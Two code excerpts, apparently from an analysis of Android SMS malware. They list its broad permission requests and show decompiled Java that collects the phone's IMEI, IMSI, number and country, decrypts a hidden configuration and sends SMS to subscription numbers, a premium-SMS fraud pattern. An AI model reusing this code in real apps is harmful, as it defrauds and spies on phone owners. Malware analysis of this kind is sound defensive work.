["```\nandroid.permission.READ_PHONE_STATE\nandroid.permission.SEND_SMS\nandroid.permission.RECEIVE_SMS\nandroid.permission.INTERNET\nandroid.permission.WAKE_LOCK\nandroid.permission.DELETE_PACKAGES\nandroid.permission.READ_SMS\nandroid.permission.MODIFY_PHONE_STATE\nandroid.permission.CALL_PHONE\nandroid.permission.CALL_PRIVILEGED\nandroid.permission.PROCESS_OUTGOING_CALLS\nandroid.permission.WRITE_CONTACTS\nandroid.permission.WRITE_EXTERNAL_STORAGE\nandroid.permission.READ_CONTACTS\nandroid.permission.RECEIVE_BOOT_COMPLETED\nandroid.permission.RECEIVE_BOOT_COMPLETED\nandroid.permission.ACCESS_WIFI_STATE\nandroid.permission.BLUETOOTH\nandroid.permission.INTERNET\n```", "```\npublic boolean load(Context context) {\n  boolean result = false;\n  log(\"Settings::load() start\");\n  try {\n    Constants.imei = getImei(context);\n    Constants.imsi = getImsi(context);\n    Constants.phone = getPhone(context);\n    Constants.country = getCountry(context);\n    if (Constants.DEBUG) {\n      Constants.imsi = \"25001\";\n      Constants.data = decript(\"VY/atwQCBfBnL/CUcJj8Wf0+uk4xyqpeOhWE273WS5...\")\n    }\n    log(\"json settings: \" + new JSONObject(Constants.data).toString(4));\n    SharedPreferences sharedPreferences = context.getSharedPreferences(\n      SETTINGS, 1);\n    if (sharedPreferences.contains(\"first\")) {\n      userAgree = sharedPreferences.getBoolean(\"userAgree\", false);\n      userCancel = sharedPreferences.getBoolean(\"userCancel\", false);\n      this.subscriptionTime = sharedPreferences.getLong(\"subscriptionTime\", 0);\n      this.repeatTime = sharedPreferences.getLong(\"repeatTime\", 0);\n      this.subscriptionPhone = sharedPreferences.getString(\n        \"subscriptionPhone\", \"\");\n      this.subscriptionMessage = sharedPreferences.getString(\n        \"subscriptionMessage\", \"\");\n      JSONArray jsonOperatorList = new JSONArray(\n        sharedPreferences.getString(\"operators\", \"\"));\n      this.operators = new Vector<>();\n      for (int i = 0; i < jsonOperatorList.length(); i++) {\n        JSONObject jsonOperator = jsonOperatorList.getJSONObject(i);\n        Operator operator = new Operator();\n        operator.name = jsonOperator.getString(\"name\");\n        operator.time = jsonOperator.getLong(\"time\");\n        this.operators.add(operator);\n      }\n      result = true;\n    }\n  } catch (Exception ex2) {\n    ex2.printStackTrace();\n  }\n  log(\"Settings::load() end\");\n  return result;\n}\n\nstatic void sendSms(JSONObject item) {\n  try {\n    Settings.sendSms(item.getString(\"phone\"), item.getString\n(Constants.JSON_TEXT));\n  } catch (Exception ex) {\n    Settings.log(ex);\n  }\n}\n```"]